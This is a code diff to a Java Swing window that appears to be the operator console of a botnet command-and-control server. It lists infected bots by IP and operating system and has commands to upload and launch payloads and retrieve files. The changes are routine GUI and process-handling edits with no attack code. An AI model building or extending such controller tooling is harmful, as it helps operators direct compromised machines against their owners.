@@ -57,7 +57,8 @@ public class ServerFrame extends JFrame {
     private BufferedReader readProc;
     private BufferedReader readProcErr;
     private BufferedWriter writeProc;
-    
+    private ProcessBuilder pb;
+    private Process p;
     private final static boolean RIGHT_TO_LEFT = false; 
     //constants to set
     private final static String PYTHONSCRIPT = "";
@@ -66,7 +67,7 @@ public class ServerFrame extends JFrame {
     private final static String UPLOADPAYLOADS = "$UP$";
     private final static String LAUNCHPAYLOADS = "$LP$";
     private final static String RETRIEVEFILES = "$RF$";
-    private final static char DELIMITER = ';';
+    private final static char DELIMITER = '$';
     
     private List<String> selectedValuesList;
     
@@ -172,11 +173,11 @@ public class ServerFrame extends JFrame {
         
         
         //for testing
-        listModel.addElement("Bot1");
-        listModel.addElement("Bot2");
-        listModel.addElement("Bot3");
-        listModel.addElement("Bot4");
-        listModel.addElement("Bot5");
+        listModel.addElement("Bot1 192.68.0.1 Windows7 x84");
+        listModel.addElement("Bot2 192.68.0.2 Ubuntu x64");
+        listModel.addElement("Bot3 192.68.0.3 Ubuntu x64");
+        listModel.addElement("Bot4 192.68.0.4 Windows7 x84");
+        listModel.addElement("Bot5 192.68.0.5 Ubuntu x64");
         
         //create the List
         botList = new JList<>(listModel);
@@ -187,6 +188,12 @@ public class ServerFrame extends JFrame {
                 if (!e.getValueIsAdjusting())
                 {
                     selectedValuesList = botList.getSelectedValuesList();
+                    for(int i = 0; i < selectedValuesList.size(); ++i)
+                    {
+                        String bot = selectedValuesList.get(i);
+                        bot = bot.replaceAll(" .*", "");
+                        selectedValuesList.set(i, bot);
+                    }
                     System.out.println(selectedValuesList);
                     b1.setEnabled(true);
                     b2.setEnabled(true);
@@ -243,9 +250,8 @@ public class ServerFrame extends JFrame {
         //start the python serverprocess
         try
         {
-            ProcessBuilder pb = new ProcessBuilder(PYTHONSCRIPT);
-            Process p = pb.start();
-            
+            pb = new ProcessBuilder(PYTHONSCRIPT);
+            p = pb.start();
             readProc = new BufferedReader(new InputStreamReader(p.getInputStream()));
             readProcErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
             writeProc = new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
@@ -274,7 +280,7 @@ public class ServerFrame extends JFrame {
             while(null != (currentLine = readProc.readLine()))
             {
                 //reformat the line
-                Updated.add(currentLine.replace(DELIMITER, '\t'));
+                Updated.add(currentLine.replace(DELIMITER, ' '));
             }
         }
         catch(Exception e)
